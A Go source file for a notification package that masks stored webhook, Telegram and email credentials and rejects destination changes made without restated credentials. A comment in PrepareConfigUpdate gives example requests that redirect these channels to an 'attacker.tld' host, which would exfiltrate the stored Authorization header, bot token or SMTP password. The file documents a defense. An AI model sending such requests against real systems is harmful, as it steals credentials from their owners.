package notify

import (
	"encoding/json"
	"fmt"
	"strings"
)

// MaskedPrefix is the marker prefix for masked values. When the API echoes credentials, it replaces the real content with a value bearing this prefix,
// and the update endpoint, upon receiving a value with this prefix, interprets it as "keep the original value in the database unchanged."
//
// Using a prefix instead of an empty string or a fixed constant serves a secondary purpose: it carries a bit of identifying information
// (see MaskedValue), so users can tell which bot this is without having to paste the key again.
const MaskedPrefix = "__masked__"

// MaskedValue generates a masked value:
//
//	"__masked__"              The original value is too short, so no hint is given
//	"__masked__:…ab12cd"      Includes the last 6 characters of the original value as an identifying hint
//
// Exposing only the last 6 characters is deliberate: a webhook URL's identifying information is in its trailing segment,
// while the prefix part is the same for every endpoint and has no identifying value. The last 6 characters are not enough
// to restore the credential, but enough for the person who configured it to recognize "that's my group".
func MaskedValue(secret string) string {
	if len(secret) <= 6 {
		return MaskedPrefix
	}
	return MaskedPrefix + ":…" + secret[len(secret)-6:]
}

// IsMasked reports whether a value is a masked value (i.e., it has not been modified since the API echoed it back).
func IsMasked(v string) bool { return strings.HasPrefix(v, MaskedPrefix) }

// MaskConfig returns a copy of the config with the channel's credential fields replaced by masked values.
//
// For an unknown channel type, it returns an empty map instead of the original config, so the UI shows "config unavailable" rather
// than echoing back raw content that may contain credentials when the channel type cannot be recognized.
// Non-credential fields are kept as-is so the UI can display them normally.
func MaskConfig(kind string, cfg map[string]any) map[string]any {
	channel, ok := Get(kind)
	if !ok {
		return map[string]any{}
	}
	secrets := map[string]bool{}
	for _, k := range channel.SecretKeys() {
		secrets[k] = true
	}
	out := make(map[string]any, len(cfg))
	for k, v := range cfg {
		if !secrets[k] {
			out[k] = v
			continue
		}
		// Nested structures such as headers are treated as a single credential as a whole: judging each sub-key individually would require
		// every channel to declare its own set of "which sub-keys are credentials" rules, and the complexity would far outweigh the benefit.
		if s, ok := v.(string); ok {
			out[k] = MaskedValue(s)
			continue
		}
		out[k] = MaskedPrefix
	}
	return out
}

// ErrDestinationChangedWithoutCredentials indicates that "the destination address changed, but the caller did not
// Take an explicit position on the credential field. Return it instead of silently allowing or silently dropping the credential; see PrepareConfigUpdate for the reasoning.
type ErrDestinationChangedWithoutCredentials struct {
	Changed []string // destination keys whose values changed
	Missing []string // credential keys that were not explicitly addressed
}

func (e *ErrDestinationChangedWithoutCredentials) Error() string {
	return "target address(" + strings.Join(e.Changed, ", ") + ") has changed. Re-enter the credential fields(" +
		strings.Join(e.Missing, ", ") + ") together: enter new values, or leave them empty to indicate that credentials are no longer needed. " +
		"Existing credentials are only valid for the previous address, so reusing them would pass them to the new address."
}

// PrepareConfigUpdate merges channel configuration and handles the security-sensitive case of a "destination address change."
//
// It replaces a bare MergeConfig on the channel update path, addressing this practically reproducible path:
// The destination address (where messages are sent) and the credentials (the identity used to send them) are two independent fields, and MergeConfig
// always keeps the stored value for "keys not mentioned." As a result, anyone who can PATCH a channel can **change only the address and say nothing about the credentials**, causing the server to send the real stored credentials to an endpoint they control:
// By staying silent about credentials**, the server can be made to send the real credentials from the library to an endpoint it controls:
//
//	webhook  {config:{url:"https://attacker.tld"}}  → the original Authorization header is sent out with the request
//	telegram {config:{base_url:"https://attacker.tld"}} → /bot<real Token>/sendMessage
//	email    {config:{host:"smtp.attacker.tld"}}    → after STARTTLS, the username and password are handed over
//
// This path is completely silent and does not depend on redirects (so refusing cross-host redirects does not stop it),
// and it directly defeats the goal of this package's masking mechanism: "credentials are not echoed back to the browser."
//
// Rule: whenever a destination key is changed to a new value, the caller must explicitly state its intent for **every** credential key:
//   - Provide a new value → use the new value
//   - Explicitly pass an empty string → this field no longer requires a credential (preserves the clear-semantics)
//   - Echo the masked value back as-is / drop this key entirely → reject
//
// The third option is also rejected because the meaning of a "masked value" is precisely "reuse the old credential," and the old credential
// is only valid for the old address. We deliberately do not "automatically discard the credential" here — for optional credential fields
// (webhook headers, email password), that would silently turn into "auth is gone but the endpoint still returns 200,"
// which is harder to troubleshoot than an error. Better to make the operator enter it once more.
//
// One exception, because otherwise the address could not be edited at all: when the destination key is itself a credential
// (the webhook URL carries its token) and the caller replaced it with a real value, the masked echoes of the other credentials
// are dropped rather than kept or rejected. They were the old address's credentials, the caller cannot restate a value the API
// only ever showed masked, and carrying them over is exactly what this guard exists to prevent.
func PrepareConfigUpdate(kind string, stored, incoming map[string]any) (map[string]any, error) {
	channel, ok := Get(kind)
	if !ok {
		return nil, fmt.Errorf("unregistered channel type: %q", kind)
	}
	secrets := channel.SecretKeys()
	destinations := channel.DestinationKeys()

	// If a non-string credential value (such as webhook headers, which is an object) embeds a mask literal inside it,
	// it means the caller slipped the "keep original value" sentinel into the struct's internals. MergeConfig only recognizes a "string
	// with the prefix" as a mask, so this shape would be stored as-is like an ordinary object — and the mask literal actually ends up persisted in the store
	// "__masked__", and subsequent authentication silently fails with no error at all. Better to reject it.
	//
	// This check must go at the **very front**: when the address is unchanged, the function takes an early return, and placing it later would amount to
	// covering only the "address changed" path (the first version was placed exactly this way, and the test caught it directly).
	if err := rejectMaskedInContainers(incoming, secrets); err != nil {
		return nil, err
	}

	// Find the destination keys that were actually changed. A masked value means "unchanged".
	var changed []string
	for _, key := range destinations {
		raw, present := incoming[key]
		if !present {
			continue
		}
		s, isStr := raw.(string)
		if isStr && IsMasked(s) {
			continue
		}
		if !sameConfigValue(raw, stored[key]) {
			changed = append(changed, key)
		}
	}
	if len(changed) == 0 {
		// The address is unchanged, so take the normal merge path (masked values keep the original value, empty strings clear it, everything else overwrites).
		return MergeConfig(stored, incoming), nil
	}

	// A destination key that is itself a credential (the webhook URL carries its
	// token) was replaced by a real value: the caller decided the address, and
	// the credentials that belonged to the old address are void with it. They
	// are dropped below instead of carried over; refusing instead would make the
	// address uneditable, because the UI can only echo a credential back masked.
	addressCredentialReplaced := false
	for _, key := range changed {
		for _, secret := range secrets {
			if key == secret {
				addressCredentialReplaced = true
			}
		}
	}

	// The address changed: require an explicit decision for each credential key.
	var missing []string
	var dropped []string
	for _, key := range secrets {
		raw, present := incoming[key]
		if !present {
			missing = append(missing, key)
			continue
		}
		if s, isStr := raw.(string); isStr && IsMasked(s) {
			if addressCredentialReplaced {
				dropped = append(dropped, key)
				continue
			}
			missing = append(missing, key)
		}
	}
	if len(missing) > 0 {
		return nil, &ErrDestinationChangedWithoutCredentials{Changed: changed, Missing: missing}
	}
	merged := MergeConfig(stored, incoming)
	for _, key := range dropped {
		delete(merged, key)
	}
	return merged, nil
}

// rejectMaskedInContainers rejects submissions that embed the mask sentinel inside non-string structures.
//
// The masking mechanism assumes that the entire value is a string. For object fields such as webhook headers,
// Only whole-value masking (written as the string "__masked__") or whole-value submission is possible; the sentinel gets stuffed inside the object.
// It can express neither "keep unchanged", and it gets stored in the database as if it were a real value.
func rejectMaskedInContainers(incoming map[string]any, secretKeys []string) error {
	for _, key := range secretKeys {
		raw, present := incoming[key]
		if !present {
			continue
		}
		if _, isStr := raw.(string); isStr {
			continue
		}
		encoded, err := json.Marshal(raw)
		if err != nil {
			continue
		}
		if strings.Contains(string(encoded), MaskedPrefix) {
			return fmt.Errorf("the %s field contains a masking marker (%q). Either leave this field entirely empty to keep the existing value, or submit a complete new value; masking markers cannot be embedded inside a structure",
				key, MaskedPrefix)
		}
	}
	return nil
}

// sameConfigValue compares whether two config values are equivalent. The JSON serialization comparison is used so that it also handles
// type differences: the port submitted by the frontend is a number, while the value read back from the store is a float64, so a direct == would give a false mismatch.
//
// "Empty" must be normalized before comparing: an empty string and "key absent" are the same state in this config model,
// Because MergeConfig treats an empty string as an explicit clear and directly delete s the key. Without normalization, one
// optional destination field that is always left blank (Telegram's base_url is the only such field: leaving it empty means
// the official address is used) would take this path—
//
//	When created, base_url:"" is saved  →  the first save gets the key deleted by MergeConfig
//	→ On the second save, incoming is "" and the stored config lacks the key, so it is judged as "the address changed"
//	→ Credentials are masked values → 400 "target address has changed, please re-enter the credential fields as well"
//
// Every save from then on fails unless the user pastes the Bot Token again, even though they changed nothing.
func sameConfigValue(a, b any) bool {
	if isBlankConfigValue(a) && isBlankConfigValue(b) {
		return true
	}
	ra, errA := json.Marshal(a)
	rb, errB := json.Marshal(b)
	if errA != nil || errB != nil {
		return false
	}
	return string(ra) == string(rb)
}

// isBlankConfigValue determines whether a config value is "empty".
// Its criteria must match the clearing check in MergeConfig (strings.TrimSpace(s) == ""),
// otherwise a gap appears where MergeConfig considers the value should be deleted while sameConfigValue considers it to have a value.
func isBlankConfigValue(v any) bool {
	if v == nil {
		return true
	}
	s, ok := v.(string)
	return ok && strings.TrimSpace(s) == ""
}

// MergeConfig merges incoming on top of stored, and is used to update channel configuration.
//
// Rules:
//   - Keys whose value in incoming is the mask → keep the original value from stored (the user did not change this field)
//   - Keys whose value in incoming is an empty string → treated as an explicit clear; delete the key
//   - All other keys → overwrite with the value from incoming
//   - Keys present in stored but absent from incoming → keep (partial update semantics)
//
// Whether an empty string counts as "clear" needs to be explicit: the frontend form submits unfilled fields as empty strings,
// and if these were written as valid values, fields that were left blank to keep their original value would actually be wiped.
// This implementation chooses explicit clearing, because when a mistakenly set field needs to be removed, the user has no other way to express that.
// (Omitting a field can be distinguished from providing an empty value, but the UI has no use for this distinction).
func MergeConfig(stored, incoming map[string]any) map[string]any {
	out := make(map[string]any, len(stored)+len(incoming))
	for k, v := range stored {
		out[k] = v
	}
	for k, v := range incoming {
		if s, ok := v.(string); ok {
			if IsMasked(s) {
				continue // Masked value = unchanged, keep stored
			}
			if strings.TrimSpace(s) == "" {
				delete(out, k)
				continue
			}
			out[k] = s
			continue
		}
		out[k] = v
	}
	return out
}
